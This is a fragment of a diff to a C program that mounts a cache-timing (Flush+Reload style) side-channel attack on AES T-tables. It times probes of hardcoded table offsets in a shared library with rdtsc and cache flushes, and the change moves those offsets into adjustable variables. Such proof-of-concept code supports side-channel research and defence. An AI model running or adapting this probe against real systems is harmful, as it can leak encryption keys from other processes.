@@ -73,7 +73,13 @@ int main()
 
     AES_encrypt(plaintext, ciphertext, &key_struct);
 
-    for (probe = base + 0x16c940; probe < base + 0x16cd40; probe += 64) // hardcoded addresses (could be done dynamically)  
+    // adjust me (decreasing order)
+    int te0 = 0x16cc80;
+    int te1 = 0x16cbc0;
+    int te2 = 0x16cac0;
+    int te3 = 0x16c9c0;
+
+    for (probe = base + te3 - 0x80; probe < base + te0 + 0xc0; probe += 64) // hardcoded addresses (could be done dynamically)
     {
       size_t count = 0;
       for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
@@ -88,7 +94,7 @@ int main()
         flush(probe);
         size_t delta = rdtsc() - time;
         if (delta >= MIN_CACHE_HIT_CYCLES
-                     + ((probe-base == 0x16c9c0 || probe-base == 0x16cac0 || probe-base == 0x16cbc0 || probe-base == 0x16cc80)? 0 : -6))
+                     + ((probe-base == te3 || probe-base == te2 || probe-base == te1 || probe-base == te0)? 0 : -6))
                      // this is a dirty hack, better: do 1 preprocessing run right after set_encrypt_key, find the 4 cache lines where you don't see
                      // any timing difference at all, these are the 4 offsets where you want to subtract the same slice difference you get from the
                      // histogram (-6 on my machine)
